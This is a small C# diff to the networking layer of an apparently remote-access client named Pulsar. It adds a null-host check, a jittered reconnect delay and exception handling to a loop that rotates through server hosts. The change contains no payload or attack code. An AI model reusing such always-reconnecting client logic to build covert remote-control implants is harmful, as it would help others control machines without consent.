@@ -72,7 +72,21 @@ namespace Pulsar.Client.Networking
                 {
                     Host host = _hosts.GetNextHost();
 
-                    base.Connect(host.IpAddress, host.Port);
+                    if (host == null || host.IpAddress == null)
+                    {
+                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
+                        Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
+                        continue;
+                    }
+
+                    try
+                    {
+                        base.Connect(host.IpAddress, host.Port);
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Connection attempt failed: {ex.Message}");
+                    }
                 }
 
                 while (Connected)
